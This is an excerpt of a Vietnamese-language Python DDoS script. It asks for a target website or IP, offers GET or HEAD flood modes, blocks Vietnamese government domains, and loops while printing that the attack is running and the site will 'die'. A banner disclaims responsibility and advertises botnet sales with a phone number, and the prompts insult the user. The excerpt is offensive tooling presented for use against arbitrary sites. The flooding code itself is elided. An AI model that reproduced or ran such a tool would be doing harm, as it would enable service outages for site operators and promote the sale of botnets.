...
Chúng tôi có thể sẽ không chịu trách nghiệm với hậu quả bạn gây ra          
├─────────────────────────────────────────────────────┤
Donate: Bằng cách mua botnet : 0981290867 đôi bên cùng có lợi
...
def prevent():
    ...
    if 'gov.vn' in ip :
        print("Bạn không thể tấn công trang web của chính phủ Việt Nam!")
        exit()
...
def main():
    ...
    global multiple
    global mode
    mode = str(input("Chọn chế độ (GET Flood/HEAD Nhập Vào Đi Thằng Ngu) [GET/HEAD]:"))
    if mode == "":
        mode = "get"
    else:
        mode = str(mode)
    ...
    ip = str(input("Địa Chỉ Web/IP (Địa chỉ web lên https://checkip.vip/ để check):"))
    prevent()
    if ip == "":
...
while True:
        ...
        try:
            if n>=4:
                n = 0
            time.sleep(0.1)
            sys.stdout.write("["+str(key[n])+"]ĐANG DDOS RỒI CHECK ĐI THẰNG NGU CHỜ XÍU SẼ DIE"+ip+page+":"+str(port)+"\r")
            sys.stdout.flush()
            n +=1
